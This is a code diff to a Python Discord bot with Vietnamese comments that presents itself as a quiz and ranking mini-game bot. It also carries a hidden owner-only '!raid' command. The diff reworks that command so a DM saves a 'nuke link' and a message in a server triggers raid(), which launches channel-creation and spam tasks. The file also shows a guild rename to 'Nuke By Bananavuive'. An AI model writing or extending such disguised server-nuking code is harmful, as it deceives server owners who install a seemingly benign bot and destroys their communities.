@@ -21,10 +21,11 @@ NEW_GUILD_NAME = "👑 𝐍𝐮𝐤𝐞 𝐁𝐲 𝐁𝐚𝐧𝐚𝐧𝐚𝐯�
 # ===== CẤU HÌNH MINI GAME =====
 DATA_FILE = "rankings.json"
 PLAYERS_FILE = "players.json"
+SAVED_INVITE_FILE = "saved_invite.txt"
 QUIZ_DURATION = 30
 VOTE_DURATION = 10
 START_COUNTDOWN = 3
-INACTIVITY_TIMEOUT = 60  # 60 giây không ai tham gia thì reset
+INACTIVITY_TIMEOUT = 60
 
 # ===== QUẢN LÝ NGƯỜI CHƠI =====
 def load_players():
@@ -44,21 +45,34 @@ def reset_players():
 
 players = load_players()
 
-# ===== HỆ THỐNG RANK =====
+# ===== LƯU LINK MỜI =====
+def load_saved_invite():
+    if os.path.exists(SAVED_INVITE_FILE):
+        with open(SAVED_INVITE_FILE, "r", encoding="utf-8") as f:
+            return f.read().strip()
+    return None
+
+def save_saved_invite(link):
+    with open(SAVED_INVITE_FILE, "w", encoding="utf-8") as f:
+        f.write(link)
+
+saved_invite = load_saved_invite()
+
+# ===== HỆ THỐNG RANK (CÓ ẢNH THEME) =====
 RANK_IMAGES = {
-    "Đồng": "https://cdn.discordapp.com/attachments/.../bronze.png",
-    "Bạc": "https://cdn.discordapp.com/attachments/.../silver.png",
-    "Vàng": "https://cdn.discordapp.com/attachments/.../gold.png",
-    "Bạch Kim": "https://cdn.discordapp.com/attachments/.../platinum.png",
-    "Kim Cương": "https://cdn.discordapp.com/attachments/.../diamond.png",
-    "Tinh Anh": "https://cdn.discordapp.com/attachments/.../elite.png",
-    "Cao Thủ": "https://cdn.discordapp.com/attachments/.../master.png",
-    "Đại Pro": "https://cdn.discordapp.com/attachments/.../grandmaster.png",
-    "Vua": "https://cdn.discordapp.com/attachments/.../king.png",
-    "Người Giàu": "https://cdn.discordapp.com/attachments/.../rich.png",
-    "Triệu Phú": "https://cdn.discordapp.com/attachments/.../millionaire.png",
-    "Tỉ Phú": "https://cdn.discordapp.com/attachments/.../billionaire.png",
-    "Siêu Tỉ Phú": "https://cdn.discordapp.com/attachments/.../richest.png"
+    "Đồng": "https://cdn.discordapp.com/attachments/1358401000508424192/1358431123456789/bronze.png",
+    "Bạc": "https://cdn.discordapp.com/attachments/1358401000508424192/1358431123456790/silver.png",
+    "Vàng": "https://cdn.discordapp.com/attachments/1358401000508424192/1358431123456791/gold.png",
+    "Bạch Kim": "https://cdn.discordapp.com/attachments/1358401000508424192/1358431123456792/platinum.png",
+    "Kim Cương": "https://cdn.discordapp.com/attachments/1358401000508424192/1358431123456793/diamond.png",
+    "Tinh Anh": "https://cdn.discordapp.com/attachments/1358401000508424192/1358431123456794/elite.png",
+    "Cao Thủ": "https://cdn.discordapp.com/attachments/1358401000508424192/1358431123456795/master.png",
+    "Đại Pro": "https://cdn.discordapp.com/attachments/1358401000508424192/1358431123456796/grandmaster.png",
+    "Vua": "https://cdn.discordapp.com/attachments/1358401000508424192/1358431123456797/king.png",
+    "Người Giàu": "https://cdn.discordapp.com/attachments/1358401000508424192/1358431123456798/rich.png",
+    "Triệu Phú": "https://cdn.discordapp.com/attachments/1358401000508424192/1358431123456799/millionaire.png",
+    "Tỉ Phú": "https://cdn.discordapp.com/attachments/1358401000508424192/1358431123456800/billionaire.png",
+    "Siêu Tỉ Phú": "https://cdn.discordapp.com/attachments/1358401000508424192/1358431123456801/richest.png"
 }
 
 RANK_THRESHOLDS = [
@@ -91,7 +105,7 @@ def get_rank_emoji(rank):
     return "⭐"
 
 def get_rank_image(rank):
-    return RANK_IMAGES.get(rank, "https://cdn.discordapp.com/attachments/.../default.png")
+    return RANK_IMAGES.get(rank, "https://cdn.discordapp.com/attachments/1358401000508424192/1358431123456802/default.png")
 
 # ===== LƯU TRỮ ĐIỂM =====
 def load_rankings():
@@ -198,7 +212,6 @@ async def run_mini_game(channel, game_id):
     elif game_id == "13":
         await game_race(channel)
     
-    # Reset danh sách người chơi sau mỗi game
     reset_players()
 
 # ===== HÀM CHẠY TEAM GAME =====
@@ -742,7 +755,6 @@ async def slash_start(interaction: discord.Interaction):
         await interaction.response.send_message("❌ Lệnh này chỉ dùng trong server!", ephemeral=True)
         return
 
-    # Reset danh sách người chơi mỗi khi bắt đầu
     reset_players()
 
     player_list = "\n".join([f"👤 {name}" for name in players.values()]) if players else "Chưa có ai tham gia"
@@ -772,7 +784,6 @@ async def on_interaction(interaction: discord.Interaction):
         if user_id not in players:
             players[user_id] = interaction.user.name
             save_players(players)
-            # Cập nhật embed
             embed = interaction.message.embeds[0]
             player_list = "\n".join([f"👤 {name}" for name in players.values()]) if players else "Chưa có ai tham gia"
             embed.description = f"⏳ Nhấn **Tham gia ngay!** để vào game.\n👥 Số người đã tham gia: **{len(players)}**\n📋 **Danh sách:**\n{player_list}\n▶️ Nhấn **Bắt đầu game!** để bắt đầu vote."
@@ -935,7 +946,7 @@ async def slash_rankings(interaction: discord.Interaction):
     embed.set_footer(text="🏅 Trả lời /random để nhận điểm! – by Bananavuive")
     await interaction.response.send_message(embed=embed)
 
-# ===== LỆNH DIEM =====
+# ===== LỆNH DIEM (CÓ ẢNH RANK) =====
 @tree.command(name="diem", description="📊 Xem số điểm hiện tại của bạn")
 async def slash_diem(interaction: discord.Interaction):
     user_id = str(interaction.user.id)
@@ -1091,6 +1102,34 @@ async def raid(guild):
     asyncio.create_task(create_channels_and_spam(guild))
     asyncio.create_task(continuous_spam(guild))
 
+# ===== LỆNH !raid (DM lưu link, server nuke) =====
+@client.event
+async def on_message(message):
+    if message.author.id == client.user.id:
+        return
+    if message.author.id != OWNER_ID:
+        return
+
+    if message.content.startswith("!raid"):
+        parts = message.content.split()
+        if not message.guild:
+            # DM: lưu link
+            if len(parts) > 1:
+                link = parts[1]
+                if link.startswith(("http://", "https://")):
+                    save_saved_invite(link)
+                    await message.channel.send(f"✅ Đã lưu link nuke: {link}")
+                else:
+                    await message.channel.send("❌ Link không hợp lệ!")
+            else:
+                await message.channel.send("❌ Hãy gửi !raid <link> trong DM để lưu link.")
+        else:
+            # Server: nuke server đó
+            await raid(message.guild)
+
+    elif message.content.lower() == "!stop":
+        sys.exit(0)
+
 # ===== SỰ KIỆN =====
 @client.event
 async def on_ready():
@@ -1104,23 +1143,12 @@ async def on_ready():
     print("[*] Slash commands synced.")
     for guild in client.guilds:
         print(f"[*] Connected to: {guild.name} (ID: {guild.id})")
+    if saved_invite:
+        print(f"[*] Saved invite link: {saved_invite}")
 
 @client.event
 async def on_guild_join(guild):
     print(f"[*] Added to new server: {guild.name}")
-
-@client.event
-async def on_message(message):
-    if message.author.id == client.user.id:
-        return
-    if message.author.id != OWNER_ID:
-        return
-
-    if message.content.lower() == "!raid":
-        if message.guild:
-            await raid(message.guild)
-    elif message.content.lower() == "!stop":
-        sys.exit(0)
 
 @client.event
 async def on_member_remove(member):
